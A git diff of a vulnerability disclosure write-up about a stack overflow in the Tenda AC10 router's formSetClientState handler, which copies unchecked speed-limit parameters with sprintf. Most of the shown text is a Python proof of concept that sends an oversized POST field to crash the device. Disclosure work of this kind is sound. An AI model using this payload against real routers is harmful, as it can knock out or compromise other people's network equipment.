@@ -16,7 +16,7 @@
 
 ![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/AC10/fromNatStaticSetting/img/2.png)
 
-It can be seen that the page is controlled by the user, and will be spliced into the gotopage with sprintf. It is worth noting that there is no size limit to cause stack overflow.
+The two variables ul_speed and dl_speed are user-controllable and will be spliced into the buff by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.
 
 ## Poc
 
@@ -37,9 +37,9 @@ r.connect((ip, port))
 rn = b'\r\n'
 
 p1 = b'a' * 0x300
-p2 = b'page=' + p1
+p2 = b'limitEn=1&deviceId=a&limitSpeedUp=a&limitSpeed=' + p1
 
-p3 = b"POST /goform/fromNatStaticSetting" + b" HTTP/1.1" + rn
+p3 = b"POST /goform/formSetClientState" + b" HTTP/1.1" + rn
 p3 += b"Host: 192.168.0.1" + rn
 p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
 p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
